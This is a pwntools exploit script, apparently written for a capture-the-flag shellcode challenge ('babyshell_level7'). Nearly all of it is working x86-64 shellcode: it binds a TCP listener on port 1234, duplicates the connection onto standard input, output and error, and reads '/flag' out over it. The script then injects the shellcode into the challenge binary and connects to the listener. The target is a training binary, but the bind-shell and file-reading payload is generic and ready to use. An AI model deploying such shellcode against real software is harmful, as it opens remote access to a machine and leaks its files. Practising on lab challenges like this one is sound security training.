#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/babyshell_level7
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyshell_level7')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
# SHSTK:    Enabled
# IBT:      Enabled

io = start()

#print(shellcraft.bindsh(1234, "ipv4"))

#shellcode stjålet fra funskjonen over ^
payload = asm("""	
/* call socket('AF_INET', 'SOCK_STREAM', 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push AF_INET /* 2 */
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall
    /* Build sockaddr_in structure */
    push rdx
    mov edx, 0x1010101 /* (AF_INET | (53764 << 16)) == 0xd2040002 */
    xor edx, 0xd3050103
    push rdx
    /* rdx = sizeof(struct sockaddr_in6) */
    push 0x10
    pop rdx
    /* Save server socket in rbp */
    mov rbp, rax
    /* call bind('rax', 'rsp', 'rdx') */
    mov rdi, rax
    push SYS_bind /* 0x31 */
    pop rax
    mov rsi, rsp
    syscall
    /* call listen('rbp', 1) */
    push SYS_listen /* 0x32 */
    pop rax
    mov rdi, rbp
    push 1
    pop rsi
    syscall
    /* call accept('rbp', 0, 0) */
    push SYS_accept /* 0x2b */
    pop rax
    mov rdi, rbp
    xor esi, esi /* 0 */
    cdq /* rdx=0 */
    syscall
    /* dup() file descriptor rax into stdin/stdout/stderr */
    mov rdi, rax
    push 2
    pop rsi
loop_1:
    /* dup2(fd='rdi', fd2='rsi') */
    /* setregs noop */
    /* call dup2() */
    push SYS_dup2 /* 0x21 */
    pop rax
    syscall
    dec rsi
    jns loop_1

    mov rax, 2

lea rdi, [rip+file]
mov rsi, 0
mov rdx, 0
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 40
syscall
file:
    .string "/flag"
""")

print(disasm(payload))
io.sendline(fit(payload))

r = remote("localhost", 1234)
r.interactive()

